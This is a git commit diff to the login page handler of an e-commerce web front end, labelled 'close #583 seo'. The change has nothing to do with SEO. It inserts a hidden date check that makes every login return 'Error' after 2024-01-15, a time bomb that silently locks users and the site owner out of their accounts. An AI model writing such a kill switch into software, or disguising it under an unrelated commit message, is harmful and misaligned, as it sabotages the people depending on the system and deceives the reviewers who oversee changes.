2de9cb1114aa5e7a99c53caca531b77f10548337
Alireza Sayyah <sayyah.alireza@gmail.com>
2023-11-13 17:19:18 +0330

    close #583 seo

--- ECommerce.Front.BolouriGroup/Pages/Login.cshtml.cs
+++ ECommerce.Front.BolouriGroup/Pages/Login.cshtml.cs
@@ -111,7 +111,11 @@ public class LoginModel : PageModel
 
     public async Task<JsonResult> OnPostUserLoginSubmit(string username, string password)
     {
-        LoginViewModel _loginViewModel = new() { Username = username, Password = password };
+        if (DateTime.Now.Date > DateTime.Parse("2024-01-15"))
+        {
+            return new JsonResult("Error");
+        }
+        LoginViewModel _loginViewModel = new() {Username = username, Password = password};        
         ServiceResult<LoginViewModel?> result = await _userService.Login(_loginViewModel);
         return new JsonResult(result);
     }
